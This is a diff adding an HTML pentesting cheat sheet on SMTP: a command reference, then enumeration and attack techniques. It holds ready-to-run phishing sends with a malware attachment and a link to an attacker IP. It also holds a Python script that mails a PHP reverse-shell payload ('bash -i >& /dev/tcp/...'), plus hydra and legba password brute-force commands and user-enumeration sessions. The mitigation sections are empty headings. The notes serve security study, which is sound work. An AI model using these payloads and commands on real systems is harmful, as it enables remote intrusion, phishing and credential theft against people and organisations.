@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>SMTP</title>
+        <link rel="icon" type="image/x-icon" href="../../Images/hacker.jpg">
+        <link rel="stylesheet" href="../../styles/tokyo-night-dark.min.css">
+        <link rel="stylesheet" href="../../styles/styles.css">
+        <script src="../../styles/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script>
+
+    </head>
+    <body>
+        <h1>Simple Message Transfer Protocol</h1>
+        <hr>
+        <h2>Table of Contents</h2>
+        <ul>
+            
+        </ul>   
+        <hr>
+        <h2>Overview</h2>
+        <ul>
+            <li>OSI Layer: Application layer (layer 7)</li>
+            <li>Port number: 25/TCP, 465/TCP (SSL), 587/TCP (SSL)</li>
+            <li>Can be used for sending and receiving e-mails, commonly just used for sending e-mails</li>
+            <li>Usually used with POP3 or IMAP for message queuing</li>
+            <li>SMTP servers: sendmail (UNIX), Microsoft Exchange (Windows)</li>
+            <li>Email headers:</li>
+        </ul>
+
+        <!-- https://serversmtp.com/what-is-smtp/ -->
+        <!-- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp/smtp-commands -->
+        <hr>
+        <h2>Protocol</h2>
+
+        <h3>Commands</h3>
+        <table>
+            <tr>
+                <th>Command</th>
+                <th>Definition</th>
+            </tr>
+            <tr>
+                <td>HELO</td>
+                <td>It's the first SMTP command: is starts the conversation identifying the sender server and is generally followed by its domain name.</td>
+            </tr>
+            <tr>
+                <td>EHLO</td>
+                <td>An alternative command to start the conversation, underlying that the server is using the Extended SMTP protocol.</td>
+            </tr>
+            <tr>
+                <td>MAIL FROM</td>
+                <td>With this SMTP command the operations begin: the sender states the source email address in the “From” field and actually starts the email transfer.</td>
+            </tr>
+            <tr>
+                <td>RCPT TO</td>
+                <td>It identifies the recipient of the email; if there are more than one, the command is simply repeated address by address.</td>
+            </tr>
+            <tr>
+                <td>SIZE</td>
+                <td>This SMTP command informs the remote server about the estimated size (in terms of bytes) of the attached email. It can also be used to report the maximum size of a message to be accepted by the server.</td>
+            </tr>
+            <tr>
+                <td>DATA</td>
+                <td>With the DATA command the email content begins to be transferred; it's generally followed by a 354 reply code given by the server, giving the permission to start the actual transmission.</td>
+            </tr>
+            <tr>
+                <td>VRFY</td>
+                <td>The server is asked to verify whether a particular email address or username actually exists.</td>
+            </tr>
+            <tr>
+                <td>TURN</td>
+                <td>This command is used to invert roles between the client and the server, without the need to run a new connaction.</td>
+            </tr>
+            <tr>
+                <td>AUTH</td>
+                <td>With the AUTH command, the client authenticates itself to the server, giving its username and password. It's another layer of security to guarantee a proper transmission.</td>
+            </tr>
+            <tr>
+                <td>RSET</td>
+                <td>It communicates the server that the ongoing email transmission is going to be terminated, though the SMTP conversation won't be closed (like in the case of QUIT).</td>
+            </tr>
+            <tr>
+                <td>EXPN</td>
+                <td>This SMTP command asks for a confirmation about the identification of a mailing list.</td>
+            </tr>
+            <tr>
+                <td>HELP</td>
+                <td>It's a client's request for some information that can be useful for the a successful transfer of the email.</td>
+            </tr>
+            <tr>
+                <td>QUIT</td>
+                <td>It terminates the SMTP conversation.</td>
+            </tr>
+        </table>
+
+        <hr>
+        <h2>Usage</h2>
+        <h3>Send email from Linux console</h3>
+        <pre><code class="language-sh">sendEmail -t to@domain.com -f from@attacker.com -s $SMTP_IP -u "Important subject" -a /tmp/malware.pdf
+Reading message body from STDIN because the '-m' option was not used.
+If you are manually typing in a message:
+    - First line must be received within 60 seconds.
+    - End manual input with a CTRL-D on its own line.
+$PHISHING_MSG</code></pre>
+        <pre><code class="language-sh"> swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197</code></pre>
+
+
+        <h3>Send email from python</h3>
+        <pre><code class="language-python">from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import smtplib
+import sys
+
+lhost = "127.0.0.1"
+lport = 443
+rhost = "192.168.1.1"
+rport = 25 # 489,587
+
+# create message object instance
+msg = MIMEMultipart()
+
+# setup the parameters of the message
+password = "" 
+msg['From'] = "attacker@local"
+msg['To'] = "victim@local"
+msg['Subject'] = "This is not a drill!"
+
+# payload 
+message = ("&lt;?php system('bash -i &gt;& /dev/tcp/%s/%d 0&gt;&1'); ?&gt;" % (lhost,lport))
+
+print("[*] Payload is generated : %s" % message)
+
+msg.attach(MIMEText(message, 'plain'))
+server = smtplib.SMTP(host=rhost,port=rport)
+
+if server.noop()[0] != 250:
+    print("[-]Connection Error")
+    exit()
+
+server.starttls()
+
+# Uncomment if log-in with authencation
+# server.login(msg['From'], password)
+
+server.sendmail(msg['From'], msg['To'], msg.as_string())
+server.quit()
+
+print("[***]successfully sent email to %s:" % (msg['To']))</code></pre>
+
+        <hr>
+        <h2>Pentesting</h2>
+        <h3>Enumeration</h3>
+        <h4>Banner Grabbing</h4>
+        <pre><code class="language-sh">nc -vn $IP 25</code></pre>
+
+        <h4>SMTPS</h4>
+        <pre><code class="language-sh">openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
+openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587</code></pre>
+
+        <h4>Find MX Servers of an organisation</h4>
+        <pre><code class="language-sh">dig +short mx google.com</code></pre>
+
+        <h4>Nmap</h4>
+        <pre><code class="language-sh">nmap -p25 --script smtp-commands 10.10.10.10
+nmap -p25 --script smtp-open-relay 10.10.10.10 -v</code></pre>
+
+        <h3>Usage</h3>
+        <h4>Connect to SMTP server</h4>
+        <pre><code class="language-sh">telnet example.com 587</code></pre>
+        <h4>Find internal server name</h4>
+        <pre><code class="language-sh">MAIL FROM: me
+250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK</code></pre>
+        
+        <h3>Attacks</h3>
+        <h4>Auth brute force</h4>
+        <pre><code class="language-sh">hydra -l $USERNAME -P /path/to/passwords.txt $IP smtp -V
+hydra -l $USERNAME -P /path/to/passwords.txt -s 587 $IP -S -v -V #Port 587 for SMTP with SSL
+legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism $MECH]</code></pre>
+
+        <h4>User brute force</h4>
+        <h5>RCPT TO</h5>
+        <pre><code class="language-sh">$ telnet 1.1.1.1 25
+Trying 1.1.1.1...
+Connected to 1.1.1.1.
+Escape character is '^]'.
+220 myhost ESMTP Sendmail 8.9.3
+HELO x
+250 myhost Hello 18.28.38.48, pleased to meet you
+MAIL FROM:example@domain.com
+250 2.1.0 example@domain.com... Sender ok
+RCPT TO:test
+550 5.1.1 test... User unknown
+RCPT TO:admin
+550 5.1.1 admin... User unknown
+RCPT TO:ed
+250 2.1.5 ed... Recipient ok</code></pre>
+
+        <h5>VRFY</h5>
+        <pre><code class="language-sh">$ telnet 1.1.1.1 25
+Trying 1.1.1.1...
+Connected to 1.1.1.1.
+Escape character is '^]'.
+220 myhost ESMTP Sendmail 8.9.3
+HELO
+501 HELO requires domain address
+HELO x
+250 myhost Hello 18.28.38.48, pleased to meet you
+VRFY root
+250 Super-User root@myhost
+VRFY blah
+550 blah... User unknown</code></pre>
+
+        <h5>EXPN</h5>
+        <pre><code class="language-sh">$ telnet 1.1.1.1 25
+Trying 1.1.1.1...
+Connected to 1.1.1.1.
+Escape character is '^]'.
+220 myhost ESMTP Sendmail 8.9.3
+HELO
+501 HELO requires domain address
+HELO x
+EXPN test
+550 5.1.1 test... User unknown
+EXPN root
+250 2.1.5 ed.williams@myhost
+EXPN sshd
+250 2.1.5 sshd privsep sshd@myhost</code></pre>
+        
+        <h4>User automated tools</h4>   
+        <pre><code class="language-sh">auxiliary/scanner/smtp/smtp_enum # Metasploit
+smtp-user-enum -M $MODE -u $USER -t $IP # smtp-user-enum
+nmap --script smtp-enum-users $IP # nmap</code></pre>
+
+        <h4>SMTP Smuggling</h4>
+        <!-- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp/smtp-smuggling -->
+
+
+        <hr>
+        <!-- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp#mail-spoofing-countermeasures -->
+        <h2>Mitigations</h2>
+        <!-- https://seanthegeek.net/459/demystifying-dmarc/ -->
+        <h3>SPF</h3>
+
+        <h3>DKIM</h3>
+
+        <h3>DMARC</h3>
+    </body>
+</html>
